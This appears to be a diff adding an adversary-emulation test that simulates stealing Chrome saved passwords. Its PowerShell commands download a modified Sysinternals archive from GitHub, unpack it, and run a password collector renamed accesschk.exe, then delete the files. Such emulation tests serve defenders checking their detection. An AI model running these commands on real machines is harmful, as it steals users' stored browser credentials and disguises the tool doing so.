@@ -1,0 +1,19 @@
+#TechniqueName: Credentials from Password Stores: Credentials from Web Browsers
+#AtomicTestName: Run Chrome-password Collector
+#Description: A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.&&Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.&&Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)&
+#Language: ps1
+
+#get_prereq_commands
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "$env:TEMP\Modified-SysInternalsSuite.zip"
+Expand-Archive $env:TEMP\Modified-SysInternalsSuite.zip $env:TEMP\sysinternals -Force
+Remove-Item $env:TEMP\Modified-SysInternalsSuite.zip -Force
+
+
+#commands
+Set-Location -path "$env:TEMP\Sysinternals";
+./accesschk.exe -accepteula .;
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\Sysinternals -Force -Recurse -ErrorAction Ignore
